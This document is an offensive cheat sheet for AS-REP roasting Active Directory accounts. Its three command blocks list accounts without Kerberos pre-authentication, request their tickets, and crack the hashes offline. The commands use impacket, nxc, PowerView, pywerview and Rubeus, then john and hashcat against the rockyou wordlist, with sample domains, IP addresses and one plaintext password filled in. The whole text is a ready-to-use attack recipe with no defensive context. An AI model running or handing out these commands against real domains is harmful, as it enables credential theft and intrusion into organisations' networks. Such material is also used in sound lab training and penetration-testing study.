- [ ] Enumerate Pre-Auth Not Required
- [ ] Request TGTs
- [ ] Cracking

Enumerate Pre-Auth Not Required!!!
```sh
# impacket
impacket-GetNPUsers cat.co.ma/ -usersfile users.txt -dc-ip 172.16.4.21
impacket-GetNPUsers -no-pass -usersfile bpmg.txt  bpmg-formation.gn/
# nxc
nxc ldap $dc -u user.txt -p '' --asreproast output.txt
# Powerview
Get-DomainUser -DonotRequiredPreAuth | select samaccountname
# pywerview
pywerview get-netuser  -w ILF.local -u jmarston -p 'P@ssword!' -t 10.129.43.20 --preauth-notreq
# powershell
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```
Request TGTs!!!
```sh
# nxc
nxc ldap $dc -u user.txt -p '' --asreproast output.txt
# Rubeus
Rubeus.exe asreproast /user:csheldon /nowrap
# GetNPUsers.py | Impacket
GetNPUsers.py corp.local/csheldon -no-pass
```
Cracking!!!
```sh
# john
john --wordlist=/usr/share/wordlists/rockyou.txt john.txt
john john.txt
# hashcat
hashcat -m 18200 -a 0 john.txt /usr/share/.../rockyou.txt 
```